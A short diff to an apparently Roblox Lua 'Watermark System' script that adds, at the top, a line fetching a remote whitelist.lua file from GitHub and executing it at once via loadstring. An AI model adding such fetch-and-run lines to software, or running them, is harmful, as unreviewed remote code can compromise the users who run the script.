@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/tenzarek/whitelist/refs/heads/main/whitelist.lua"))()
+
 -- Watermark System
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
